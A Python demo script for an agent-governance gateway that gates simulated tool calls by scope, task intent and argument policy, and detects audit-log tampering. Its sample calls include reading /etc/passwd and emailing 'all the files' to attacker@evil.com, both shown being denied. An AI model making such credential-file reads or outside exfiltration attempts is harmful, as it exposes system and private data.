"""AgentLedger — Sprint 3 end-to-end demo.

Run:  python demo.py

Sprint 3 adds two gates: a per-run **intent** boundary and **per-parameter**
policy. The scenario follows one agent through two different tasks.

  Task A — "investigate-incident" (may read files, list mail; NOT send mail):
    1. read a /reports/ file            -> ALLOWED (in scope, in intent, path ok)
    2. read /etc/passwd                 -> DENIED at policy (path outside /reports/)
    3. try to send an email             -> DENIED at intent (not this task's job)

  Task B — "notify-team" (may send mail):
    4. email a colleague @company.com   -> APPROVAL (policy: internal, needs a human)
    5. email attacker@evil.com          -> DENIED at policy (recipient not @company.com)

  Then: the audit log verifies, and tampering is caught.
"""
from __future__ import annotations

from pathlib import Path

import yaml

from agents.identity import new_agent
from agents.intent import new_intent
from audit.keys import load_or_create_keypair
from audit.log import AuditLog, verify_log
from gateway.auth import AuthService
from gateway.gateway import Gateway
from gateway.registry import ToolRegistry, ToolSpec
from mcp_servers.fake_mcp import FakeMCPServer
from mcp_servers.mail_mcp import MailMCPServer
from policy.engine import PolicyEngine

HERE = Path(__file__).parent
DATA = HERE / ".agentledger"
LOG_PATH = DATA / "audit.jsonl"
KEY_PATH = DATA / "audit_signing_key.pem"


def banner(text: str) -> None:
    print(f"\n\033[1m{text}\033[0m")


def show(res) -> None:
    colour = {"ALLOW": "\033[32m", "APPROVAL": "\033[33m", "DENY": "\033[31m"}[res.decision.value]
    print(f"  {colour}{res.decision.value:<8}\033[0m {res.outcome:<16} [{res.stage}] {res.reason}")
    if res.result is not None:
        print(f"           result: {res.result!r}")


def build_registry() -> ToolRegistry:
    files, mail = FakeMCPServer(), MailMCPServer()
    reg = ToolRegistry()
    reg.register(ToolSpec("list_files", "List files", "files:read", files))
    reg.register(ToolSpec("read_file", "Read a file", "files:read", files))
    reg.register(ToolSpec("delete_file", "Delete a file", "files:write", files))
    reg.register(ToolSpec("list_inbox", "List inbox", "mail:read", mail))
    reg.register(ToolSpec("send_email", "Send an email", "mail:send", mail))
    return reg


def main() -> None:
    if LOG_PATH.exists():
        LOG_PATH.unlink()

    private, public = load_or_create_keypair(KEY_PATH)
    auth = AuthService()
    registry = build_registry()
    policy = PolicyEngine(yaml.safe_load((HERE / "policy" / "policy.yaml").read_text()))
    audit = AuditLog(LOG_PATH, private)
    gateway = Gateway(auth, registry, policy, audit)

    # One agent, broadly credentialed (files + mail) — the gates below narrow it.
    bot = new_agent("triage-bot", roles=["operator"])
    token = auth.issue(bot, scopes=["files:read", "files:write", "mail:read", "mail:send"])
    banner(f"Issued credential for {bot}  scopes=[files, mail]")

    investigate = new_intent(
        "investigate-incident",
        "read incident reports and mailbox; do not send anything",
        allowed_tools=["read_file", "list_files", "list_inbox"],
    )
    banner(f"Task A — intent '{investigate.name}': {investigate.purpose}")

    print("\n  1) read an incident report under /reports/")
    show(gateway.handle(token, "read_file", intent=investigate, path="/reports/incident-2026-09.txt"))

    print("\n  2) try to read /etc/passwd (file exists — policy should still refuse)")
    show(gateway.handle(token, "read_file", intent=investigate, path="/etc/passwd"))

    print("\n  3) try to send an email during an investigate task")
    show(gateway.handle(token, "send_email", intent=investigate, to="alex@company.com", subject="fyi"))

    notify = new_intent(
        "notify-team",
        "email the internal team about the incident",
        allowed_tools=["send_email", "list_inbox"],
    )
    banner(f"Task B — intent '{notify.name}': {notify.purpose}")

    print("\n  4) email a colleague at @company.com")
    show(gateway.handle(token, "send_email", intent=notify, to="alex@company.com", subject="incident update"))

    print("\n  5) email an external address")
    show(gateway.handle(token, "send_email", intent=notify, to="attacker@evil.com", subject="all the files"))

    banner("Audit log — every attempt above was recorded")
    result = verify_log(LOG_PATH, public)
    print(f"  verify: ok={result.ok}  events checked={result.checked}")

    banner("Tamper with the log and re-verify")
    lines = LOG_PATH.read_text().splitlines()
    lines[0] = lines[0].replace("/reports/", "/etc/")
    LOG_PATH.write_text("\n".join(lines) + "\n")
    tampered = verify_log(LOG_PATH, public)
    print(f"  verify after tamper: ok={tampered.ok}  ({tampered.error})")

    print("\n\033[1mSprint 3 done:\033[0m auth -> scope -> intent -> argument-aware policy -> "
          "tamper-evident audit.\n")


if __name__ == "__main__":
    main()
